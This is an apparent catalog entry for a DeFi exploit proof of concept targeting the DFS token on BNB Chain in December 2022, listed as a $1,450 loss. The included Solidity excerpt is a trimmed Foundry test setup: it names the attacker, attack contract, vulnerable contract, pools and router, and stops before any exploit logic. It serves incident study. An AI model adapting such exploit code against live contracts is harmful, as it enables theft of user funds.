# [?] - DFS - Insufficient validation + flashloan

## Summary
Severity: Unknown
Chain: BNB Chain
Component: DFS
Published: 2022-12-30
Source: https://github.com/SunWeb3Sec/DeFiHackLabs/blob/main/src/test/2022-12/DFS_exp.sol
Type: defi-exploit-poc

## Details
Lost: $1450

```solidity
// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.10;

import "forge-std/Test.sol";
import "./../interface.sol";

// @KeyInfo - Total Lost : ~1,450 US$
// Attacker : 0xb358BfD28b02c5e925b89aD8b0Eb35913D2d0805
// Attack Contract : 0x87bfd80c2a05ee98cfe188fd2a0e4d70187db137
// Vulnerable Contract : 0x2B806e6D78D8111dd09C58943B9855910baDe005
// Attack Tx : https://bscscan.com/tx/0xcddcb447d64c2ce4b3ac5ebaa6d42e26d3ed0ff3831c08923c53ea998f598a7c

// @Info
// Vulnerable Contract Code : https://bscscan.com/address/0x2B806e6D78D8111dd09C58943B9855910baDe005#code#830

// @Analysis
// CertiKAlert : https://twitter.com/CertiKAlert/status/1608788290785665024

CheatCodes constant cheat = CheatCodes(0x7109709ECfa91a80626fF3989D68f67F5b1DD12D);
IPancakePair constant USDT_CCDS_LP = IPancakePair(0x2B948B5D3EBe9F463B29280FC03eBcB82db1072F);
IPancakePair constant DFS_USDT_LP = IPancakePair(0x4B02D85E086809eB7AF4E791103Bc4cde83480D1);
IPancakeRouter constant pancakeRouter = IPancakeRouter(payable(0x10ED43C718714eb63d5aA57B78B54704E256024E));
address constant usdt = 0x55d398326f99059fF775485246999027B3197955;
address constant dfs = 0x2B806e6D78D8111dd09C58943B9855910baDe005;
address constant ccds = 0xBFd48CC239bC7e7cd5AD9F9630319F9b59e0B9e1;

contract Attacker is Test {
    //  forge test --contracts ./src/test/DFS_exp.sol -vvvv
    function setUp() public {
        cheat.label(address(pancakeRouter), "pancakeRouter");
        cheat.label(address(USDT_CCDS_LP), "USDT_CCDS_LP");
        cheat.label(address(DFS_USDT_LP), "DFS_USDT_LP");
        cheat.label(usdt, "USDT");
        cheat.label(dfs, "dfs");
        cheat.label(ccds, "ccds");
```

_Trimmed to 38 lines — full report: https://github.com/SunWeb3Sec/DeFiHackLabs/blob/main/src/test/2022-12/DFS_exp.sol_
